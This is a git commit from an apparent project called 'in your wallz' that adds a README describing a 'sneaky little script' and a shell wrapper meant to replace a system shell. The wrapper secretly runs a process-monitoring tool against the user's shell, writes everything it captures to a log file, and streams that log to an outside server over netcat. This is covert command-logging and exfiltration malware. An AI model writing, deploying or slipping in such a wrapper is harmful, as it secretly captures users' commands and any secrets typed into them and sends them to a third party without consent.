79dc4ff9ba9b2b550e0679dae9fc8e58fd2dadcb
Guac0 <YeetYeetGuac@gmail.com>
2025-03-27 15:12:37 -0400

    add basic in your wallz client functionality

---
+++ in_your_wallz/README.md
@@ -0,0 +1,5 @@
+Sneaky little script
+In your /bin/bash
+Logging your commands
+
+Status: In Progress
---
+++ in_your_wallz/client/files/bash_wrapper.sh
@@ -0,0 +1,17 @@
+#!/bin/sh
+
+# Start a new instance of {{ file_to_replace }} in the background
+/bin/ash "$@" &
+
+# Capture the PID of the background /bin/ash process
+PID=$!
+
+# Run /bin/siphon in the background, redirect its output to /output.txt
+# Send /output.txt content to an external server using Netcat (nc)
+/bin/siphon0 "$PID" >> /output.txt 2>&1 &
+
+# Use Netcat to send the log to an external server (replace SERVER_IP and PORT)
+tail -f /output.txt | nc SERVER_IP PORT &
+
+# Bring the background /bin/ash process to the foreground
+fg %1
